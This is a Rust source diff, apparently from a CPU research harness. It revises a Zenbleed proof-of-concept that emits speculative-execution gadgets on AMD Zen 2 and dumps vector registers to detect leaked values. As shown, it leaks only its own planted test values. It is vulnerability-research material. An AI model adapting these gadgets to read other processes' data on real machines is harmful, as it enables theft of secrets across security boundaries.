@@ -12,6 +12,7 @@ fn main() {
     let mut harness = HarnessConfig::default_zen2()
         .dump_vgpr(true)
         .zero_strategy_fp(ZeroStrategyFp::Vzeroall)
+        .zero_strategy(ZeroStrategy::MovFromZero)
         .emit();
     Zenbleed::run(&mut harness);
 }
@@ -83,7 +84,7 @@ fn main() {
 /// ====
 ///
 /// 1. Flush the BTB in an attempt to consistently cause SLS. 
-/// 2. Pollute the PRF with our own "probe" values.
+/// 2. Pollute the PRF with our own "probe" values (or whatever we'd like).
 /// 3. Run the gadget some number of times and dump the vector registers.
 /// 4. Check the register dumps for our probe values. 
 ///
@@ -91,36 +92,52 @@ fn main() {
 pub struct Zenbleed;
 impl Zenbleed {
     /// The source YMM register whose zero bit will be set.
-    const SRC_YMM: VectorGpr = VectorGpr::YMM2;
+    const SRC_YMM: VectorGpr = VectorGpr::YMM14;
     /// The target YMM register whose upper-half will contain a leaked value.
-    const TGT_YMM: VectorGpr = VectorGpr::YMM3;
+    const TGT_YMM: VectorGpr = VectorGpr::YMM15;
     /// The number of allocated probe values. 
     const NUM_PROBES: usize = (1 << 10); 
+
 
     /// Emit the test. 
     fn emit() -> X64Assembler {
         let mut f = X64Assembler::new().unwrap();
 
-        // Pollute the physical register file with values that will be leaked
+        // Pick your poison: (emit some gadget that pollutes the physical 
+        // register file with values that will be visible with the bug).
         //Self::emit_leak_probe_1(&mut f, 0);
         //Self::emit_probe_setup_1(&mut f, 0);
         //Self::emit_probe_setup_1(&mut f, 1);
         //Self::emit_probe_setup_1(&mut f, 2);
 
-        // Leak the value of RAX
-        Self::emit_leak_spec_rax(&mut f, 32, |f| {
-            dynasm!(f
-                ; xor rax, rax
-                ; mov rax, 0xdead_c0de
-            );
-        });
+        // Speculatively leak the value in RAX into the vector PRF. 
+        //
+        // NOTE: The use of `TGT_YMM` here is not necessary; you can allocate 
+        // for any YMM register (so long as it isn't `SRC_YMM`, which will 
+        // be sacrificially set to zero for triggering the bug).
+        //
+        Self::emit_leak_spec_rax(&mut f, 256, Self::TGT_YMM,
+            // Prelude
+            Some(|f| { 
+                dynasm!(f
+                    ; mov r10, 0
+                )
+            }),
 
-        // Flush the BTB with unconditional always-taken branches
+            // User code
+            |f| {
+            dynasm!(f
+                ; mov rax, 0xdead_c0de
+
+            )},
+        );
+
+        // [Try to] flush the BTB with jumps
         for _ in 0..0x4000 { dynasm!(f ; jmp >next ; next:); }
 
         f.emit_rdpmc_start(0, Gpr::R15 as u8);
 
-        // Pick your poison
+        // Pick your poison (emit some gadget for triggering the bug)
         Self::emit_gadget_sls_indirect(&mut f);
         //Self::emit_gadget_sls_direct(&mut f);
         //Self::emit_gadget_conditional_direct(&mut f);
@@ -135,8 +152,9 @@ impl Zenbleed {
     fn run(harness: &mut PerfectHarness) {
         //let event = Zen2Event::ExRetBrnIndMisp(0x00);
 
-        // NOTE: We expect to see count FP ops when VZEROUPPER is dispatched
-        // (indicating that we actually mispredicted the branch). 
+        // NOTE: We expect to see one more FP ops when VZEROUPPER is 
+        // speculatively dispatched (indicating that we've actually 
+        // mispredicted and probably triggered the bug). 
         let event = Zen2Event::DeDisOpsFromDecoder(DeDisOpsFromDecoderMask::Fp);
 
         // Emit the test
@@ -181,8 +199,8 @@ impl Zenbleed {
                         probe_map.insert(probe, 1);
                     }
                 } 
-                // If this is some other leaked value
-                else if tgt[2] != 0 {
+                // If this is some other value
+                else {
                     let val = LeakedValue(tgt[2] as usize);
                     if let Some(cnt) = nonprobe_map.get_mut(&val) {
                         *cnt += 1;
@@ -276,16 +294,17 @@ impl Zenbleed {
     fn emit_leak_spec_rax(
         f: &mut X64Assembler, 
         iters: usize,
+        tgt_reg: VectorGpr,
+        prelude: Option<fn(&mut X64Assembler)>,
         user_fn: fn(&mut X64Assembler),
     ) 
     {
         let myfunc = f.new_dynamic_label();
-        let regid = 4;
         dynasm!(f
             ; mov rax, 0
-            ; mov rcx, iters as i32
-            ; vpxor Ry(regid), Ry(regid), Ry(regid)
-            ; vpxor Ry(regid), Ry(regid), Ry(regid)
+            ; mov r8, iters as i32
+            ; vpxor Ry(tgt_reg as u8), Ry(tgt_reg as u8), Ry(tgt_reg as u8)
+            ; vpxor Ry(tgt_reg as u8), Ry(tgt_reg as u8), Ry(tgt_reg as u8)
 
             ; .align 64
             ; ->top:
@@ -299,17 +318,29 @@ impl Zenbleed {
             ; .bytes NOP8
             ; .bytes NOP8
             ; lfence
+        );
+
+        // Optionally emit some code before the CALL
+        if let Some(p) = prelude {
+            p(f);
+        }
+
+        // CALL with the expectation that the next RET will be mispredicted.
+        dynasm!(f
             ; call =>myfunc
         );
 
-        // The user-provided function will be speculatively executed.
-        // This expects that you're going to leak whatever ends up in RAX.
+        // In the shadow of the mispredicted RET, speculatively execute 
+        // whatever the user has provided. 
         user_fn(f);
-        for _ in 0..8 {
+
+        // Speculatively leak RAX into the target XMM/YMM register.
+        // NOTE: Probably no reason to repeat this multiple times. 
+        for _ in 0..4 {
             dynasm!(f
-                ; vmovq Rx(regid), rax
-                //; vpinsrq Rx(regid), Rx(regid), rax, 9
-                ; vpbroadcastq Ry(regid), Rx(regid)
+                ; vmovq Rx(tgt_reg as u8), rax
+                //; vpinsrq Rx(tgt_reg as u8), Rx(tgt_reg as u8), rax, 9
+                ; vpbroadcastq Ry(tgt_reg as u8), Rx(tgt_reg as u8)
             );
         }
 
@@ -324,9 +355,9 @@ impl Zenbleed {
 
             ; .align 64
             ; ->setup_done:
-            ; dec rcx
-            ; cmp rax, 0
-            ; cmp rcx, 0
+            ; dec r8
+            //; cmp rax, 0
+            ; cmp r8, 0
             ; jne ->top
         );
     }
